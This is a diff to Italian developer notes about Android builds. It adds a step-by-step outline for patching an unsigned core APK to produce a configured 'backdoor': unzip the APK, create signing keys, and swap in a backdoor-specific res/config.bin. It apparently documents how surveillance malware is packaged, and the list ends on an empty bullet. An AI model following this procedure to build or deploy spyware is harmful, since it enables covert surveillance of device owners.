@@ -2,7 +2,15 @@
 http://www.androidengineer.com/2010/06/using-ant-to-automate-building-android.html
 
 Manifest : debug / release / demo
-
-
-
 Dalvik error:  si risolve facendo un "ant clean" da console e un rebuild da eclipse 
+
+Procedura di binary patch.
+- il core e' un solo file, viene compilato con ant htrelease ed e' 
+	android_service-unaligned.apk.
+- questo file non e' firmato, contiene il config.bin da sostituire, e il file da 
+	binary patchare.
+- alla creazione della backdoor, se e' la prima volta, vengono create le chiavi, 
+	nella directory keys, con la procedura keysCreation.bat
+- il file core, che e' uno zip, viene decompresso in una directory temporanea.
+- il config della backdoor deve sostituire quello generico posto in res/config.bin
+- 
